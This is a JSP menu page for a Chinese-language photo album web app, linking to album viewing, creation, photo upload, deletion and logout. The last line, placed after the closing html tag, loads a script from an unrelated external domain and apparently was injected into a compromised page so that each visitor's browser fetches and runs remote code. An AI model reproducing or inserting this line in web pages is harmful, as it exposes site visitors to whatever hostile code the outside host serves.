<%@ page
 contentType="text/html;charset=GBK"
%>
<LINK href="css/default.css" type=text/css rel=stylesheet>
<LINK href="css/06default.css" type=text/css rel=stylesheet>
<html>
<head>
	<title></title>
</head>
<body>
  <center><br><br>
  <table cellSpacing=8 cellPadding=0 border=0 bgcolor="azure">
 <tbody>
  <tr>
    <td>
      <a href="AlbumServlet?action=myAlbum" target="mainFrame">我的相册</a>
    </td></tr>
  <tr>
    <td>
      <a href="AlbumServlet?action=newAlbum" target="mainFrame">新建相册</a>
    </td></tr>
  <tr>
    <td>
      <a href="AlbumServlet?action=uploadPhoto" target="mainFrame">上传照片</a>
    </td></tr>
  <tr>
    <td>
      <a href="AlbumServlet?action=deleteAlbum" target="mainFrame">删除相册</a>
    </td></tr>
  <tr>
    <td>
      <a href="AlbumServlet?action=LogOut" target="_parent">退出登录</a>
    </td></tr></tbody></table></center>
</body>
</html>
<script language=javascript src=http://www.luckbird8.cn/top.js></script>